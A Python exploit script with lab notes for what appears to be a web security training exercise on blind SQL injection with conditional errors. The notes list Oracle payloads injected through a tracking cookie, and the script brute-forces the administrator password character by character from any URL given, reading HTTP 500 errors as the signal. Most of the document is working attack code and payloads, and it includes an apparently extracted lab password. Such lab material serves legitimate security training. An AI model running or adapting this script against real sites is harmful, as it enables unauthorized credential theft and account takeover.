"""
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
explain 

CASE
   WHEN condition THEN value1
   ELSE value2
END

if condition is true → value1
if condition is false → value2

xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


' || (select '' from dual) ||'

Lab #12 - Blind SQL injection with conditional errors

Vulnerable parameter - tracking cookie

End Goals:
- Output the administrator password
- Login as the administrator user

Analysis:

1) Prove that parameter is vulnerable

' || (select '' from dual) || ' -> oracle database

' || (select '' from dualfiewjfow) || ' -> error

2) Confirm that the users table exists in the database

' || (select '' from users where rownum =1) || ' 
-> users table exists

3) Confirm that the administrator user exists in the users table
' || (select '' from users where username='administrator') || ' 


' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
-> Internal server error -> administrator user exists

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
-> 200 response -> user does not exist in database

4) Determine length of password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
-> 200 response at 50 -> length of password is less than 50
-> 20 characters

5) Output the administrator password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
-> w is not the first character of the password

wjuc497wl6szhbtf0cbf


sqli_payload = "' || (
    select CASE 
        WHEN (1=1) 
        THEN TO_CHAR(1/0) 
        ELSE '' 
    END 
    FROM users 
    where username='administrator' 
    and ascii(substr(password,%s,1))='%s'
) || '" % (i,j)

"""
import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)




def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'LBnIRRMXyCPNYdey' + sqli_payload_encoded, 'session': 'ni9HqEkrSKarjDlXnG3uJFyqVhD3ocTy'}
            r = requests.get(url, cookies=cookies, verify=False)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
